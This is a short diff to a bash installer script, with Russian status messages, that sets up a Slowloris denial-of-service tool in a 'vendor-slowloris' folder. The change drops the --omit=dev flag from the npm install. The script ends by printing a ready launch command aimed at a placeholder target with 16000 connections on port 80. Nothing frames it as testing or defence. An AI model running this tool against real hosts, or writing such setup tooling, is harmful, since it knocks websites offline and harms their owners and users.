@@ -22,7 +22,7 @@ else
 fi
 
 echo "[+] Ставлю npm-зависимости..."
-npm install --prefix "$REPO_DIR/vendor-slowloris" --omit=dev
+npm install --prefix "$REPO_DIR/vendor-slowloris"
 
 echo "[+] Готово. Запуск:"
 echo "    node \$HOME/slowattack_bash/vendor-slowloris/lib/index.js -p 80 -s 16000 -i 20 http://TARGET.sslip.io"
